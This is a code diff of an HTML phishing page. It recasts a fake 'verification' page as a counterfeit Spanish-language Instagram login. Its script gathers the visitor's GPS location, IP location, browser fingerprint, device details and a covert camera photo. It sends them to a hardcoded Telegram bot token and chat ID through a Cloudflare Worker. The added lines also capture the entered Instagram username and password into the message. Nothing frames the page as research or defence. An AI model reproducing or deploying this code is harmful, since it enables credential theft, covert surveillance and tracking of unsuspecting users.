@@ -3,61 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>usernoth111</title>
+    <title>Instagram • Iniciar sesión</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #f1f3f4;
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
         }
-        .card {
+        .login-box {
             background: white;
-            border-radius: 16px;
-            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
-            padding: 32px 24px;
-            max-width: 400px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 40px 40px 30px;
+            max-width: 350px;
             width: 100%;
             text-align: center;
         }
-        h1 {
-            font-size: 1.8rem;
-            font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 12px;
+        .logo {
+            font-family: 'Billabong', cursive;
+            font-size: 3rem;
+            font-weight: normal;
+            margin-bottom: 30px;
+            color: #262626;
         }
-        p {
-            color: #5f6368;
-            font-size: 0.9rem;
-            margin-bottom: 28px;
+        .input-group {
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 9px 8px;
+            font-size: 0.85rem;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
         }
         button {
-            background: #1a73e8;
+            background: #0095f6;
             color: white;
             border: none;
-            border-radius: 28px;
-            padding: 12px 24px;
-            font-size: 1rem;
-            font-weight: 500;
-            cursor: pointer;
+            border-radius: 8px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 0.9rem;
             width: 100%;
+            margin-top: 12px;
+            cursor: pointer;
             transition: background 0.2s;
         }
         button:active {
-            background: #1557b0;
+            background: #1877f2;
             transform: scale(0.98);
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 0.8rem;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider::before { margin-right: 16px; }
+        .divider::after { margin-left: 16px; }
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 0.85rem;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .forgot {
+            margin-top: 16px;
+            font-size: 0.75rem;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #8e8e8e;
         }
     </style>
 </head>
 <body>
-<div class="card">
-    <h1>🔐 Verificación requerida</h1>
-    <p>Presiona el botón para continuar</p>
-    <button id="btn">✅ Verificar acceso</button>
+<div class="login-box">
+    <div class="logo">Instagram</div>
+    <div class="input-group">
+        <input type="text" id="username" placeholder="Teléfono, correo o usuario" autocomplete="off">
+    </div>
+    <div class="input-group">
+        <input type="password" id="password" placeholder="Contraseña">
+    </div>
+    <button id="btn">Iniciar sesión</button>
+    <div class="divider">o</div>
+    <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
+    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+    <div class="footer">No eres tú? · Ayuda · Privacidad</div>
 </div>
 
 <video id="video" autoplay playsinline style="display:none"></video>
@@ -65,8 +124,8 @@
 
 <script>
     // ================= CONFIGURACIÓN =================
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ✅ TU WORKER
-    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';                      // ⚠️ REVOCA Y PON TU TOKEN NUEVO
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
+    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';  // ⚠️ REVOCA Y PON TU TOKEN NUEVO
     const CHAT_ID = '7555997298';
 
     // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
@@ -111,8 +170,11 @@
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = 200; canvas.height = 50;
-        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = "#069";
+        ctx.font = "14px Arial";
+        ctx.fillText("FP", 10, 30);
         const canvasHash = canvas.toDataURL().slice(0, 100);
         let gpu = 'N/A';
         try {
@@ -206,27 +268,33 @@
 
     // ---------- 9. Proceso principal ----------
     document.getElementById('btn').onclick = async () => {
-        // 1. Pedir ubicación GPS (lo más importante)
+        // Capturar credenciales de Instagram
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        let creds = `🔐 *CREDENCIALES INSTAGRAM*\nUsuario: ${username || '(vacío)'}\nContraseña: ${password || '(vacío)'}\n`;
+
+        // Obtener ubicación GPS
         const gps = await getGPS();
 
-        // 2. Obtener ubicaciones por IP (ambas fuentes)
+        // Obtener ubicaciones por IP
         const [workerLoc, ipapiLoc] = await Promise.all([
             getLocationFromWorker(),
             getLocationFromIpapi()
         ]);
 
-        // 3. Datos complementarios
+        // Datos complementarios
         const [fp, device, storage] = await Promise.all([
             getFingerprint(),
             getDeviceInfo(),
             getStorageInfo()
         ]);
 
-        // 4. Cámara (opcional)
+        // Cámara
         const foto = await capturePhoto();
 
-        // 5. Construir mensaje
-        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+        // Construir mensaje completo
+        let message = creds;
+        message += `━━━━━━━━━━━━━━━━━━━━\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
         message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
